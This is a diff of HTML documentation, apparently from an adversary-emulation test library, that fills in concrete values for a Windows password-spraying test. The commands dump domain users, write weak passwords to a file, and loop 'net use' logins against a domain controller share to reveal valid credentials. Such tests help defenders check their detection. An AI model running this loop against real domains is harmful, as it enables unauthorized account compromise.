@@ -519,11 +519,11 @@
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>net user /domain &gt; #{input_file_users}
-echo &quot;Password1&quot; &gt;&gt; #{input_file_passwords}
-echo &quot;1q2w3e4r&quot; &gt;&gt; #{input_file_passwords}
-echo &quot;Password!&quot; &gt;&gt; #{input_file_passwords}
-@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %n:%p &amp;&amp; @net use /delete #{remote_host} &gt; NUL
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>net user /domain &gt; DomainUsers.txt
+echo &quot;Password1&quot; &gt;&gt; passwords.txt
+echo &quot;1q2w3e4r&quot; &gt;&gt; passwords.txt
+echo &quot;Password!&quot; &gt;&gt; passwords.txt
+@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (passwords.txt) DO @net use \\COMPANYDC1\IPC$ /user:YOUR_COMPANY\%n %p 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %n:%p &amp;&amp; @net use /delete \\COMPANYDC1\IPC$ &gt; NUL
 </pre></div>
 </div>
 <div class="cell docutils container">
